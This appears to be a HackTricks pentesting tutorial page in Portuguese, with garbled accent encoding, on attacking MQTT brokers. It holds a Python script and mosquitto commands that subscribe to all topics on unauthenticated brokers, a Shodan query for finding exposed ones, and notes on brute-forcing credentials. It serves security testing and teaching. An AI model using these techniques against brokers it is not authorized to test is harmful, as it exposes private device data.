## Informa√ß√£o B√°sica

MQTT significa MQ Telemetry Transport. √â um protocolo de mensagens de publica√ß√£o/assinatura, **extremamente simples e leve**, projetado para dispositivos restritos e redes de baixa largura de banda, alta lat√™ncia ou n√£o confi√°veis. Os princ√≠pios de design s√£o minimizar a largura de banda da rede e os requisitos de recursos do dispositivo, ao mesmo tempo em que tentam garantir confiabilidade e algum grau de garantia de entrega. Esses princ√≠pios tamb√©m tornam o protocolo ideal para o mundo emergente de "m√°quina a m√°quina" (M2M) ou "Internet das coisas" de dispositivos conectados e para aplicativos m√≥veis onde a largura de banda e a energia da bateria s√£o essenciais.

**Porta padr√£o:** 1883
```
PORT     STATE SERVICE                 REASON
1883/tcp open  mosquitto version 1.4.8 syn-ack
```
## Inspe√ß√£o do tr√°fego

Os brokers MQTT enviam um pacote **CONNACK** em **resposta** a um pacote CONNECT. O **c√≥digo de retorno 0x00** indica que as credenciais s√£o v√°lidas e o c√≥digo de retorno **0x05 indica que n√£o s√£o. Exemplo de 0x05:**

![](<../.gitbook/assets/image (645) (1).png>)

### [**Brute-Force MQTT**](../generic-methodologies-and-resources/brute-force.md#mqtt)

## Pentesting MQTT

**A autentica√ß√£o √© totalmente opcional** e mesmo que a autentica√ß√£o esteja sendo realizada, **a criptografia n√£o √© usada por padr√£o** (as credenciais s√£o enviadas em texto claro). Ataques MITM ainda podem ser executados para roubar senhas.

Para se conectar a um servi√ßo MQTT, voc√™ pode usar: [https://github.com/bapowell/python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell) e se inscrever em todos os t√≥picos fazendo:
```
> connect (NOTICE that you need to indicate before this the params of the connection, by default 127.0.0.1:1883)
> subscribe "#" 1
> subscribe "$SYS/#"
```
Voc√™ tamb√©m pode usar [**https://github.com/akamai-threat-research/mqtt-pwn**](https://github.com/akamai-threat-research/mqtt-pwn)
```bash
apt-get install mosquitto mosquitto-clients
mosquitto_sub -t 'test/topic' -v #Subscriribe to 'test/topic'
```
Ou voc√™ pode **executar este c√≥digo para tentar se conectar a um servi√ßo MQTT sem autentica√ß√£o, se inscrever em todos os t√≥picos e ouvi-los**:
```python
#This is a modified version of https://github.com/Warflop/IOT-MQTT-Exploit/blob/master/mqtt.py
import paho.mqtt.client as mqtt
import time
import os

HOST = "127.0.0.1"
PORT = 1883

def on_connect(client, userdata, flags, rc):
	client.subscribe('#', qos=1)
	client.subscribe('$SYS/#')

def on_message(client, userdata, message):
	print('Topic: %s | QOS: %s  | Message: %s' % (message.topic, message.qos, message.payload))

def main():
	client = mqtt.Client()
	client.on_connect = on_connect
	client.on_message = on_message
	client.connect(HOST, PORT)
	client.loop_start()
	#time.sleep(10)
	#client.loop_stop()

if __name__ == "__main__":
	main()
```
## Mais informa√ß√µes

aqui: [https://morphuslabs.com/hacking-the-iot-with-mqtt-8edaf0d07b9b](https://morphuslabs.com/hacking-the-iot-with-mqtt-8edaf0d07b9b)

### O Padr√£o Publicar/Assinar <a href="#b667" id="b667"></a>

O modelo publicar/assinar √© composto por:

* **Editor**: publica uma mensagem em um (ou muitos) t√≥pico(s) no broker.
* **Assinante**: assina um (ou muitos) t√≥pico(s) no broker e recebe todas as mensagens enviadas pelo editor.
* **Broker**: roteia todas as mensagens dos editores para os assinantes.
* **T√≥pico**: consiste em um ou mais n√≠veis que s√£o separados por uma barra invertida (por exemplo, /smartshouse/livingroom/temperature).

![](https://miro.medium.com/max/1073/1\*sIxvchdgHSqAGebJjFHBAg.png)

### Formato do Pacote <a href="#f15a" id="f15a"></a>

Cada pacote MQTT cont√©m um cabe√ßalho fixo (Figura 02).Figura 02: Cabe√ßalho Fixo

![](https://miro.medium.com/max/838/1\*k6RkAHEk0576geQGUcKSTA.png)

O primeiro campo do cabe√ßalho fixo representa o tipo do Pacote MQTT. Todos os tipos de pacotes est√£o listados na tabela 01.Tabela 01: Tipos de Pacotes MQTT

![](https://miro.medium.com/max/1469/1\*z0fhdUVzGa0PLikH\_cyBmQ.png)

## Shodan

* `port:1883 MQTT`

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
